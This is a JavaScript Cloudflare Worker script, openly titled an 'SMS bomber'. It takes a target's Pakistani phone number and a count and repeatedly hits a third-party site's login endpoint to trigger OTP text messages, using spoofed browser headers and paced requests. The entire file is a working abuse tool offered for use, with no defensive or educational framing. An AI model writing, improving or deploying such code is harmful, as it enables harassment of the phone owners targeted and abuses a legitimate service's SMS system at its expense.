// SMS BOMBER - SIMPLE VERSION
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Only allow GET requests
  if (request.method !== 'GET') {
    return new Response('Only GET method allowed', { status: 405 })
  }
  
  const url = new URL(request.url)
  const phone = url.searchParams.get('phone')
  const qty = parseInt(url.searchParams.get('qty')) || 1
  
  // Check if phone provided
  if (!phone) {
    return new Response(JSON.stringify({
      error: true,
      message: "Add ?phone=03271234567 to URL",
      example: "https://your-worker.workers.dev/?phone=03271234567&qty=10"
    }), {
      headers: { 'Content-Type': 'application/json' }
    })
  }
  
  // Format phone number
  let formattedPhone = phone.replace(/\D/g, '')
  
  // Pakistan number formatting
  if (formattedPhone.startsWith('0')) {
    formattedPhone = '92' + formattedPhone.substring(1)
  } else if (formattedPhone.length === 10) {
    formattedPhone = '92' + formattedPhone
  }
  
  // Make sure it's 12 digits
  if (formattedPhone.length !== 12) {
    return new Response(JSON.stringify({
      error: true,
      message: "Invalid Pakistan phone number",
      provided: phone,
      formatted: formattedPhone
    }), {
      headers: { 'Content-Type': 'application/json' }
    })
  }
  
  // Send OTP requests
  const results = []
  let success = 0
  let fail = 0
  
  for (let i = 0; i < qty; i++) {
    try {
      // Use deikho.com API
      const apiUrl = `https://deikho.com/login?phone=${formattedPhone}`
      
      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate, br',
          'Connection': 'keep-alive',
          'Upgrade-Insecure-Requests': '1',
          'Sec-Fetch-Dest': 'document',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-Site': 'same-origin',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        },
        cf: {
          // Cloudflare specific settings
          cacheTtl: 0,
          cacheEverything: false,
          polish: 'off'
        }
      })
      
      if (response.status === 200 || response.status === 302) {
        success++
        results.push(`Request ${i+1}: Success (${response.status})`)
      } else {
        fail++
        results.push(`Request ${i+1}: Failed (${response.status})`)
      }
      
      // Small delay between requests
      if (i < qty - 1) {
        await new Promise(resolve => setTimeout(resolve, 200))
      }
      
    } catch (error) {
      fail++
      results.push(`Request ${i+1}: Error (${error.message})`)
    }
  }
  
  // Return results
  return new Response(JSON.stringify({
    phone: formattedPhone,
    requested: qty,
    success: success,
    failed: fail,
    percentage: ((success / qty) * 100).toFixed(1) + '%',
    results: results.slice(0, 10) // Show first 10 results only
  }, null, 2), {
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*'
    }
  })
}
